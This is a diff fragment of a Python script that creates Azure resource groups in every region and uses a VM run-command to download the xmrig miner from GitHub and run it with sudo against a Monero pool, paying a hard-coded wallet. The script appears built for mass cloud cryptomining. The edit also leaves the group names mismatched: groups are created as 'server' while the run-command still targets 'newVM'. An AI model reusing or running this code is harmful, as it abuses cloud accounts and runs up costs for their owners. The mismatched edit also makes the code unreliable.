@@ -36,7 +36,7 @@ response = az_cli('account list-locations')
 def deployer(x):
         location=(response[x]["name"])
         #CREATING GROUP
-        group   = az_cli('group create --name newVM'+str(x)+' --location '+location)
+        group   = az_cli('group create --name server'+str(x)+' --location '+location)
         if(len(str(group))!=4):
           if (len(group)==7):
             runC='az vm run-command invoke -g newVM'+str(x)+' -n newVM'+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
